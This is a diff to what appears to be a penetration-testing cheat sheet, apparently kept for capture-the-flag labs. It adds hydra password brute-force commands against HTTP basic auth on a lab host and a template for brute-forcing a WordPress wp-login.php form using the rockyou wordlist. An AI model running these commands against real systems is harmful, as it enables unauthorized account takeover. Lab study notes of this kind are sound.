@@ -212,6 +212,14 @@ hydra -l /path/to/user/list -P /usr/share/wordlists/rockyou.txt ssh://$IP
 force http-get
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 3000 -f $IP http-get /<address>
+
+#example
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /inferno/ -t 64
+```
+
+wordpress or any http post request
+```
+hydra -L lists/usrname.txt -P lists/pass.txt <wp site address> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
 
 ## Sample Hashcat Brute-Forcing
